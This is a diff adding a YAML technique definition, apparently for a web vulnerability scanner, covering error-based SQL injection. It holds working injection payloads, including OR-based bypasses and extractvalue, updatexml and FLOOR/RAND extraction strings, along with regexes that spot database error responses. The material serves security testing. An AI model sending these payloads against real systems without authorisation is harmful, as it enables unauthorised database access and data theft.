@@ -1,0 +1,29 @@
+techniques:
+  - id: sqli_error_basic
+    name: "SQL Injection - Error Based"
+    vuln_type: sqli
+    description: "Error-based SQL injection using common error-triggering payloads"
+    severity: high
+    technology: ["mysql", "postgresql", "mssql", "oracle"]
+    depth: standard
+    tags: ["sqli", "error-based", "classic"]
+    payloads:
+      - value: "' OR '1'='1"
+        description: "Classic OR-based injection"
+      - value: "' OR 1=1--"
+        description: "OR injection with comment"
+      - value: "\" OR \"\"=\""
+        description: "Double-quote variant"
+      - value: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+        description: "Error-based extraction via FLOOR/RAND"
+      - value: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
+        description: "Error-based extraction via extractvalue (MySQL)"
+      - value: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -"
+        description: "Error-based extraction via updatexml (MySQL)"
+    detection:
+      - type: regex
+        value: "SQL syntax|mysql_fetch|pg_query|ORA-|Microsoft SQL"
+        description: "Database error messages in response"
+      - type: regex
+        value: "\\d+\\.\\d+\\.\\d+"
+        description: "Version number extracted via error"
